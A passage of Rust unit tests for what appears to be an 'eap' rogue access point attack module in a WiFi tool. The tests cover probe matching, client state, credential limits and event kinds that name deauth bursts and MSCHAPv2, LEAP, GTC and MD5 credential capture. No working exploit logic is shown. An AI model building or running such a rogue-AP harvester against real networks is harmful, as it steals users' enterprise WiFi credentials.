        assert!(!check_probe_ssid(&frame, "OtherNet"));
    }

    #[test]
    fn test_check_probe_ssid_broadcast() {
        // Broadcast probe: SSID tag with length 0
        let mut frame = vec![0u8; 24];
        frame.push(0x00); // SSID tag
        frame.push(0x00); // length = 0 (broadcast)

        assert!(check_probe_ssid(&frame, "AnySSID"));
    }

    #[test]
    fn test_check_probe_ssid_too_short() {
        let frame = vec![0u8; 20]; // too short for management header
        assert!(!check_probe_ssid(&frame, "Test"));
    }

    // ── Client state ──

    #[test]
    fn test_client_new_defaults() {
        let mac = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let client = EapClient::new(mac, 1);
        assert_eq!(client.state, ClientState::Idle);
        assert_eq!(client.eap_id, 1);
        assert_eq!(client.aid, 1);
        assert!(client.identity.is_empty());
        assert!(client.domain.is_empty());
        assert_eq!(client.seq_num, 0);
    }

    // ── EapAttack struct ──

    #[test]
    fn test_eap_attack_new() {
        let params = EapParams::default();
        let attack = EapAttack::new(params);
        assert!(!attack.is_done());
        assert!(!attack.is_running());
        assert_eq!(attack.name(), "eap");
        let info = attack.info();
        assert_eq!(info.phase, EapPhase::Idle);
        assert!(!info.running);
    }

    #[test]
    fn test_eap_attack_events_empty() {
        let attack = EapAttack::new(EapParams::default());
        let events = attack.events();
        assert!(events.is_empty());
    }

    // ── Info defaults ──

    #[test]
    fn test_info_default() {
        let info = EapInfo::default();
        assert_eq!(info.phase, EapPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.clients_total, 0);
        assert_eq!(info.credentials_total, 0);
        assert_eq!(info.beacons_sent, 0);
        assert_eq!(info.frames_sent, 0);
        assert_eq!(info.frames_received, 0);
        assert!(info.ssid.is_empty());
        assert!(info.last_identity.is_empty());
    }

    // ── Random bytes ──

    #[test]
    fn test_random_bytes_not_all_zero() {
        let mut buf = [0u8; 16];
        random_bytes(&mut buf);
        // Statistically impossible to be all zero
        assert!(buf.iter().any(|&b| b != 0));
    }

    #[test]
    fn test_random_bytes_different_calls() {
        let mut buf1 = [0u8; 16];
        let mut buf2 = [0u8; 16];
        random_bytes(&mut buf1);
        // Small sleep to ensure different timestamp
        std::thread::sleep(Duration::from_millis(1));
        random_bytes(&mut buf2);
        // Very unlikely to be identical
        assert_ne!(buf1, buf2);
    }

    // ── Hex encode ──

    #[test]
    fn test_hex_encode() {
        assert_eq!(hex_encode(&[0xDE, 0xAD, 0xBE, 0xEF]), "deadbeef");
        assert_eq!(hex_encode(&[0x00, 0xFF]), "00ff");
        assert_eq!(hex_encode(&[]), "");
    }

    // ── Max credentials check ──

    #[test]
    fn test_should_stop_unlimited() {
        let params = EapParams { max_credentials: 0, ..Default::default() };
        let creds = vec![EapCredential::new(
            MacAddress::ZERO, EapType::Identity, "a", "", 0, Duration::ZERO,
        ); 100];
        assert!(!should_stop_for_max_creds(&params, &creds));
    }

    #[test]
    fn test_should_stop_at_limit() {
        let params = EapParams { max_credentials: 3, ..Default::default() };
        let creds = vec![EapCredential::new(
            MacAddress::ZERO, EapType::Identity, "a", "", 0, Duration::ZERO,
        ); 3];
        assert!(should_stop_for_max_creds(&params, &creds));
    }

    #[test]
    fn test_should_stop_below_limit() {
        let params = EapParams { max_credentials: 5, ..Default::default() };
        let creds = vec![EapCredential::new(
            MacAddress::ZERO, EapType::Identity, "a", "", 0, Duration::ZERO,
        ); 2];
        assert!(!should_stop_for_max_creds(&params, &creds));
    }

    // ── Phase/State enums ──

    #[test]
    fn test_phase_default() {
        assert_eq!(EapPhase::default(), EapPhase::Idle);
    }

    #[test]
    fn test_client_state_default() {
        assert_eq!(ClientState::default(), ClientState::Idle);
    }

    // ── Event kind coverage ──

    #[test]
    fn test_event_kind_debug() {
        // Ensure all event kinds can be Debug-printed (catches missing derives)
        let kinds = vec![
            EapEventKind::ChannelLocked { channel: 6 },
            EapEventKind::RogueApStarted { bssid: MacAddress::ZERO, ssid: "Test".into() },
            EapEventKind::ClientAuthenticated { mac: MacAddress::ZERO, rssi: -50 },
            EapEventKind::ClientAssociated { mac: MacAddress::ZERO, aid: 1 },
            EapEventKind::IdentityRequestSent { mac: MacAddress::ZERO },
            EapEventKind::IdentityReceived { mac: MacAddress::ZERO, identity: "u".into(), domain: "d".into() },
            EapEventKind::ChallengeSent { mac: MacAddress::ZERO, method: EapType::MsChapV2 },
            EapEventKind::ClientNak { mac: MacAddress::ZERO, rejected: EapType::Gtc, desired: Some(EapType::MsChapV2) },
            EapEventKind::MethodRetried { mac: MacAddress::ZERO, new_method: EapType::Leap },
            EapEventKind::MsChapV2Captured { mac: MacAddress::ZERO, identity: "u".into() },
            EapEventKind::LeapCaptured { mac: MacAddress::ZERO, identity: "u".into() },
            EapEventKind::GtcCaptured { mac: MacAddress::ZERO, identity: "u".into(), password: "p".into() },
            EapEventKind::Md5Captured { mac: MacAddress::ZERO, identity: "u".into() },
            EapEventKind::IdentityStored { mac: MacAddress::ZERO, identity: "u".into() },
            EapEventKind::EapFailureSent { mac: MacAddress::ZERO },
            EapEventKind::DeauthBurst { target_bssid: MacAddress::ZERO, count: 5 },
            EapEventKind::ClientTimeout { mac: MacAddress::ZERO },
            EapEventKind::MaxCredentialsReached { count: 10 },
            EapEventKind::TimeoutReached { elapsed: Duration::from_secs(60) },
            EapEventKind::AttackComplete { credentials_total: 3, elapsed: Duration::from_secs(120) },
            EapEventKind::Error { message: "test".into() },
        ];
        for kind in &kinds {
            let _ = format!("{:?}", kind);
        }
    }
}
